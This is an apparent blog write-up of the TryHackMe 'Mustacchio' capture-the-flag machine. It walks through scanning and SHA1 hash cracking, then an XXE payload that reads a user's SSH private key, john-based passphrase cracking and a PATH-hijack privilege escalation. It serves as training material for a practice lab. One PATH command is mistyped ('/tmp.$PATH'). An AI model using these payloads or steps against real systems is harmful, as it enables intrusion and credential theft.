---
title: TryHackMe - Mustacchio
layout: post
categories:
- TryHackMe
tag:
- xxe,
- privesc,
- enumeraton
image: "/assets/img/mustacchio.png"
image_alt: mustacchio
---

Easy boot2root Machine. Let's start.

<br>

## 1. Mustacchio 

Deploy and compromise the machine!

<br>

### 1.1 User Flag?

_Hint: Check the source of the page._

Let's do a `nmap` scan first.

```
$ nmap -sSV -p- 10.10.80.114
```

![nmap](/assets/img/tryhackme/mustacchio/nmap.png)

We found three open ports. These are `22/tcp SSH, 80/tcp HTTP, and 8765/tcp HTTP`.

First, let's visit the website running on port 80/tcp and see what we can find.
Five different pages appear. These are home, about, gallery, blog, and contact. 

![home](/assets/img/tryhackme/mustacchio/home.png)

I am checking the links and source pages that can be visited on the website, but I could not find anything remarkable.
 
I decided to do a directory scan with Gobuster. But first, let's visit the website running on 8765/tcp port.

![admin](/assets/img/tryhackme/mustacchio/admin.png)

We found an admin panel, it will help us. Anyway, let's go back to port 80/tcp and do a gobuster scan.

![gobuster](/assets/img/tryhackme/mustacchio/gobuster.png)

The custom directory looks interesting. When we go inside, we find a file called `user.bak`, which is interesting.

![userbak](/assets/img/tryhackme/mustacchio/userbak.png)

Let's see what's in it.

![admincode](/assets/img/tryhackme/mustacchio/admincode.png)

**`admin : 1868e36a6d2b17d4c2745f1659433a54d4bc5f4b`**

I guess this is the login information to the admin panel but the password seems to be encrypted. 
I check with the hash-identifier. 

![codeid](/assets/img/tryhackme/mustacchio/codeid.png)

Most likely admin's password is encrypted using `SHA1`.

You can decrypt online from any website by searching for "SHA1 decrypt" in the browser. I used the following website. [Here](https://md5decrypt.net/en/Sha1/#answer)

![decode](/assets/img/tryhackme/mustacchio/decode.png)

We found the password.

**`admin : b*****19`**

Now let's go to the admin panel and log in.
We logged in.

![comment](/assets/img/tryhackme/mustacchio/comment.png)

I've tried a few command injections into the area that comes up, but it just seems like a gimmick.

I'm checking the source of the page and we're getting some important information here. 
- We explore the /auth/dontforget.bak file. 

- ![dontforget](/assets/img/tryhackme/mustacchio/dontforget.png)

- We discover that Barry is now able to log into SSH.

- ![barryssh](/assets/img/tryhackme/mustacchio/barryssh.png) 

Let's first check the dontforget.bak file.

Download directly from here [http://10.10.80.114:8765/auth/dontforget.bak](http://10.10.80.114:8765/auth/dontforget.bak). 

Something like this welcomes us.

![dontforgetbakin](/assets/img/tryhackme/mustacchio/dontforgetbakin.png)

But there is one important thing about this code, it's not a complete waste of time. 
This code is an XML code, if we copy this code and paste it into the comment section in the admin panel, we get the following result.

![joe](/assets/img/tryhackme/mustacchio/joe.png)

I mean, we need to write xml code in this comment section. So I am trying to do command injection using xml.

I tried the commands [here](https://github.com/payloadbox/xxe-injection-payload-list) but no result.

But I realized something, I was constantly getting this result.

![empty](/assets/img/tryhackme/mustacchio/empty.png)

Here I understood that I should use the tags in dontforget.bak.

First I decided to give it a try with the code below.

![try](/assets/img/tryhackme/mustacchio/try.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example "XML Injection"> ]>
<comment>
  <name>Joe Hamd</name>
  <author>&example;</author>
<com>Test paragraph</com>
</comment>
```

![tryout](/assets/img/tryhackme/mustacchio/tryout.png)

It worked as you can see. Now we can access the information inside the system. 

We got the message that Barry can now log in to ssh, if we go to Barry's directory and get the rsa key, we can log in too. 

I run the following code in the admin panel to get the id_rsa key.

![commentinssh](/assets/img/tryhackme/mustacchio/commentinssh.png)

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE replace [<!ENTITY example SYSTEM 'file:////home/barry/.ssh/id_rsa'>]>
<comment>
  <name>Joe Hamd</name>
  <author>Joe</author>
<com>&example;</com>
</comment>
```

![outrsa](/assets/img/tryhackme/mustacchio/outrsa.png)

Yes, we have reached the RSA key, now we need to copy and edit this key. I tried without editing and it doesn't work :D.
Make sure there are no spaces at the end of the lines. Each one should be a separate line.
It should look like this when you edit it. 

![edit](/assets/img/tryhackme/mustacchio/edit.png)

Now we need to crack this id_rsa for barry's ssh password.

```
$ ssh2john id_rsa > id_rsa.hash
$ john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

![crack](/assets/img/tryhackme/mustacchio/crack.png)

**`barry : u*******s`**

Now we can log in ssh.

```
$ chmod 600 id_rsa
$ ssh -i id_rsa barry@10.10.80.114
```

![barryin](/assets/img/tryhackme/mustacchio/barryin.png)

And we are inside.

Now we can access the user flag.

![user-flag](/assets/img/tryhackme/mustacchio/user-flag.png)

<br>

### 1.2 Root Flag?

_Hint: SUID?_

We proceed with the clue that the question gives us. First, we will run the following code.

```
$ find / -type f -perm -04000 -ls 2>/dev/null
``` 

![suid](/assets/img/tryhackme/mustacchio/suid.png)

I couldn't find anything remarkable and started navigating the system. 

I discovered the joe directory next to barry, and if you remember a file like `live_log` in it, we also saw this file as a result of the code we wrote above.

![ls](/assets/img/tryhackme/mustacchio/ls.png)

I'm looking at the strings content of this log file and we find something remarkable here. The tail command was used.

```
$strings live_log
```

![strings](/assets/img/tryhackme/mustacchio/strings.png)

I've been doing some research on how to escalate using this and I find that it's as follows.

![privesc](/assets/img/tryhackme/mustacchio/privesc.png)

```
$ echo "/bin/sh" > tail
$ chmod 777 tail
$ export PATH=/tmp.$PATH
$ cd /home/joe/
$ ./live_log
```

And we are inside. To be frank, I don't fully understand the logic of raising authority, I'll go over it a little later.
But now we can get to root.txt.

![root-flag](/assets/img/tryhackme/mustacchio/root-flag.png)

<br>

---

<br>

It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.

<br>
